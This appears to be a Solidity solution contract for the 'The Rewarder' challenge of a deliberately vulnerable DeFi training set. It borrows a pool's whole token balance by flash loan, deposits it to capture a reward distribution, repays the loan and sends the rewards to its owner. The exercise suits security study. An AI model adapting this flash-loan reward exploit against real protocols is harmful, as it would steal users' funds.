// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solmate/src/auth/Owned.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import "hardhat/console.sol";

contract AttackerTheRewarder is Owned {
    using Address for address;

    FlashLoanerPool private immutable i_pool;
    TheRewarderPool private immutable i_victim;
    DamnValuableToken private immutable i_token;
    RewardToken private immutable i_reward;

    error Wrong_Caller();

    constructor(address _pool, address _victim, address _token, address _reward) Owned(msg.sender) {
        i_pool = FlashLoanerPool(_pool);
        i_victim = TheRewarderPool(_victim);
        i_token = DamnValuableToken(_token);
        i_reward = RewardToken(_reward);
    }

    function executeAttack() public onlyOwner {
        i_pool.flashLoan(i_token.balanceOf(address(i_pool)));
    }

    function receiveFlashLoan(uint256 amount) public {
        if (msg.sender != address(i_pool)) {
            revert Wrong_Caller();
        }

        i_token.approve(address(i_victim), amount);
        i_victim.deposit(amount);
        i_victim.distributeRewards();
        i_victim.withdraw(amount);

        i_token.transfer(address(i_pool), amount);
        i_reward.transfer(owner, i_reward.balanceOf(address(this)));
    }
}
